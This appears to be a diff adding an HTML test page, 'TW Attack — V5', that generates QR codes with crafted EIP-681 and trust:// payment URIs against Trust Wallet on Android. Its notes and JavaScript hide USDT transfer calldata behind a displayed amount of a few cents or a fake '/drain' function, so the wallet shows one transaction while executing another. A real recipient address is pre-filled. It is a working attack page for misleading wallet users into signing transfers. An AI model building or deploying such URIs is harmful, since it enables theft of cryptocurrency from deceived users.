@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>TW Attack — V5: Android Focus</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0d1117;color:#e6edf3;padding:16px;max-width:700px;margin:0 auto}
+h1{font-size:18px;margin-bottom:4px;color:#f0883e}
+.subtitle{font-size:11px;color:#8b949e;margin-bottom:16px}
+.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:14px;margin-bottom:14px}
+.card h3{font-size:13px;margin-bottom:4px}
+.card .theory{font-size:11px;color:#c9d1d9;background:#0d1117;padding:8px;border-radius:6px;margin-bottom:8px;border-left:3px solid #f0883e}
+.qr-cell{text-align:center;background:#0d1117;padding:10px;border-radius:8px;border:1px solid #21262d;margin-bottom:8px}
+.qr-cell img{max-width:200px;max-height:200px;border-radius:6px;background:white;padding:6px}
+.qr-cell .uri-box{font-size:8px;color:#8b949e;word-break:break-all;background:#0d1117;padding:4px;border-radius:4px;margin-top:4px;max-height:28px;overflow-y:auto}
+.badge{display:inline-block;padding:2px 7px;border-radius:10px;font-size:9px;font-weight:600;margin-bottom:3px}
+.badge-a{background:#f0883e22;color:#f0883e;border:1px solid #f0883e44}
+.badge-b{background:#58a6ff22;color:#58a6ff;border:1px solid #58a6ff44}
+.badge-c{background:#8957e522;color:#a371f7;border:1px solid #8957e544}
+.result-row{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;margin:8px 0;font-size:10px}
+.result-row div{background:#0d1117;padding:6px;border-radius:4px;text-align:center}
+.result-row .lbl{color:#8b949e;font-size:8px;text-transform:uppercase}
+input{width:100%;padding:10px;background:#0d1117;border:1px solid #30363d;border-radius:8px;color:#e6edf3;font-size:14px;font-family:monospace;margin-bottom:6px}
+input:focus{outline:none;border-color:#f0883e}
+label{font-size:11px;color:#8b949e;display:block;margin-bottom:2px;margin-top:6px}
+.btn{width:100%;padding:12px;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;background:#f0883e;color:#0d1117;margin:8px 0}
+.btn:hover{background:#f0a05e}
+.status{font-size:12px;margin-top:8px;color:#8b949e}
+.ftr{text-align:center;font-size:10px;color:#484f58;margin-top:20px}
+</style>
+</head>
+<body>
+<h1>🔬 V5 — Android Focus</h1>
+<p class="subtitle">Test with built-in QR scanner (top-right camera button)</p>
+
+<div class="card">
+<h3><span class="badge badge-a">A</span> EIP-681 no fn + <b>higher ETH value</b> + data</h3>
+<div class="theory">
+Previous Test C had <code>value=1</code> (1 wei = 0.000000000000000001 ETH) → next button disabled.<br>
+This time: <code>value=10000000000000</code> (0.00001 ETH ≈ $0.02) — passes minimum?<br>
+<code>ethereum:0xUSDT@1?value=0.00001&data=...</code> — shows "0.00001 ETH to USDT contract"
+</div>
+<div class="qr-cell">
+<img id="qrA" src="" loading="lazy">
+<div class="uri-box" id="uriA"></div>
+</div>
+<div class="result-row"><div><div class="lbl">Shows</div>0.00001 ETH → USDT contract</div><div><div class="lbl">Executes</div>4 USDT transfer via data</div><div><div class="lbl">Route</div>contract_generic</div></div>
+</div>
+
+<div class="card">
+<h3><span class="badge badge-b">B</span> trust:// WITH asset + minimal amount + data</h3>
+<div class="theory">
+<code>asset</code> lets the wallet auto-select USDT. Amount=10 (0.00001 USDT) passes minimum 0.00000001 check.<br>
+Problem: erc20_transfer builds calldata from this amount, ignores data.<br>
+<strong>But let's verify:</strong> does amount=10 let you proceed? Then we can see what executes.
+</div>
+<div class="qr-cell">
+<img id="qrB" src="" loading="lazy">
+<div class="uri-box" id="uriB"></div>
+</div>
+<div class="result-row"><div><div class="lbl">Shows</div>0.00001 USDT</div><div><div class="lbl">Executes</div>0.00001 USDT (control)</div><div><div class="lbl">Route</div>erc20_transfer</div></div>
+</div>
+
+<div class="card">
+<h3><span class="badge badge-c">C</span> EIP-681 + fake function name (contract_generic route)</h3>
+<div class="theory">
+Using <code>/pay</code> or <code>/drain</code> — function name TW doesn't recognize as ERC-20 → routes to <b>contract_generic</b> or <b>Tx::transfer</b>.<br>
+<code>ethereum:0xUSDT@1/drain?address=X&uint256=1000000&data=...</code><br>
+If wallet shows address + amount + function name but passes data through → win
+</div>
+<div class="qr-cell">
+<img id="qrC" src="" loading="lazy">
+<div class="uri-box" id="uriC"></div>
+</div>
+<div class="result-row"><div><div class="lbl">Shows</div>??? <code>/drain</code> function</div><div><div class="lbl">Executes</div>4 USDT if data passes through</div><div><div class="lbl">Route</div>contract_generic</div></div>
+</div>
+
+<label>USDT Contract / TO Address</label>
+<input type="text" id="token" value="0xdAC17F958D2ee523a2206206994597C13D831ec7">
+<label>Recipient (embedded in calldata)</label>
+<input type="text" id="recipient" value="0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a">
+
+<button class="btn" id="genBtn">🔗 Generate Android Test QR Codes</button>
+<div class="status" id="statusMsg">Generate and scan with built-in camera (top-right button)</div>
+<div class="ftr">Android only: scan from home screen camera, NOT from Send flow</div>
+
+<script>
+(function(){
+const TOKEN_NAMES={'0xdac17f958d2ee523a2206206994597c13d831ec7':'USDT'};
+function p(v,b){return v.toString(16).toLowerCase().padStart(b*2,'0')}
+function enc(rec,amt,dec){const r=rec.replace('0x','').toLowerCase();const a=BigInt(Math.round(amt*Math.pow(10,dec)));return'0xa9059cbb'+r.padStart(64,'0')+p(a,32)}
+const D=6;
+function gen(){
+const t=document.getElementById('token').value.trim();
+const r=document.getElementById('recipient').value.trim();
+if(!/^0x[a-fA-F0-9]{40}$/.test(t)||!/^0x[a-fA-F0-9]{40}$/.test(r)){document.getElementById('statusMsg').textContent='❌ Invalid address';return}
+const calldata=enc(r,4,D); // execute 4 USDT
+const asset='c60_t0x'+t.replace('0x','').toLowerCase();
+
+// A: EIP-681 no fn, value=0.00001 ETH (10000000000000 wei) + data
+const valWei='10000000000000'; // 0.00001 ETH
+const uA='ethereum:'+t+'@1?value='+valWei+'&data='+calldata;
+document.getElementById('qrA').src='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(uA);
+document.getElementById('uriA').textContent=uA;
+
+// B: trust:// WITH asset + amount=10 (0.00001 USDT, passes minimum) + data
+const uB='trust://send?asset='+asset+'&address='+r+'&amount=10&data='+calldata;
+document.getElementById('qrB').src='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(uB);
+document.getElementById('uriB').textContent=uB;
+
+// C: EIP-681 + /drain function name
+const uC='ethereum:'+t+'@1/drain?address='+r+'&uint256=1000000&data='+calldata;
+document.getElementById('qrC').src='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(uC);
+document.getElementById('uriC').textContent=uC;
+
+document.getElementById('statusMsg').textContent='✅ 3 QRs generated. Scan each with built-in camera. Report what you see on screen.';
+document.getElementById('statusMsg').style.color='#3fb950';
+}
+document.getElementById('genBtn').addEventListener('click',gen);
+document.querySelectorAll('input').forEach(el=>el.addEventListener('keydown',function(e){if(e.key==='Enter')gen()}));
+setTimeout(gen,100);
+})();
+</script>
+</body>
+</html>
